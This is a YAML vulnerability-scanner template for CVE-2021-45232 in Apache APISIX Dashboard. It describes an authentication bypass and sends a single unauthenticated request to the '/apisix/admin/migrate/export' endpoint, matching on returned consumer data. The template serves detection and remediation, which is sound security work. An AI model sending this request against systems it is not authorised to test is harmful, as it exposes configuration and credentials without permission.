id: CVE-2021-45232

info:
  name: Apache APISIX Dashboard <2.10.1 - API 未授权访问
  author: Mr-xn
  severity: critical
  description: In Apache APISIX Dashboard before 2.10.1, the Manager API uses two frameworks and introduces framework `droplet` on the basis of framework `gin.' While all APIs and authentication middleware are developed based on framework `droplet`,  some API directly use the interface of framework `gin` thus bypassing their authentication.
  remediation: Upgrade to release 2.10.1 or later. Or, change the default username and password, and restrict the source IP to access the Apache APISIX Dashboard.
  tags: apisix
  metadata:
    max-request: 1

http:
  - method: GET
    path:
      - "{{RootURL}}/apisix/admin/migrate/export"

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '"Consumers":'

      - type: status
        status:
          - 200

# Enhanced by mp on 2022/04/22
